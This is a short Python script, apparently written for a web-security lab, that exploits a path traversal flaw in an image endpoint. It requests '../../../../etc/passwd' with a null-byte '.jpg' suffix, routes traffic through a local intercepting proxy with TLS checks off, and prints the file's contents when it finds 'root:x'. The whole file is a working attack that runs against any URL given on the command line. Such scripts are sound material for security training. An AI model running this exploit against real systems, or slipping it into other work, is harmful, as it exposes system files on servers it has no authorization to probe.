import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def directory_traversal(url):
    image_url = url + '/image?filename=../../../../etc/passwd%00.jpg'
    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print('[+] works.')
        print('[+] contents of /etc/passwd')
        print(r.text)
    else:
        print('[+] failed')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
      print('[+] usage: %s <url>' % sys.argv[0])
      print('[+] example: %s <domain.com>' % sys.argv[0])
      sys.exit(-1)
    
    url = sys.argv[1]
    print('[+] exploiting')
    directory_traversal(url)





if __name__ == "__main__":
    main()